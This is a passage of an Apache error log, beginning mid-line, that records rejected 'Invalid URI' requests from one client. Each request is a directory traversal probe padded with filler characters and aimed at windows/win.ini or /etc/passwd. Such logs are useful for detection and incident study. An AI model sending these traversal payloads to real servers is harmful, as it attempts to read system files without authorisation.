/css//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:32.966075 2021] [core:error] [pid 10994] [client 27.147.202.214:7504] AH00126: Invalid URI in request GET /js//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Thu Jul 08 01:47:35.402834 2021] [core:error] [pid 10887] [client 27.147.202.214:7083] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
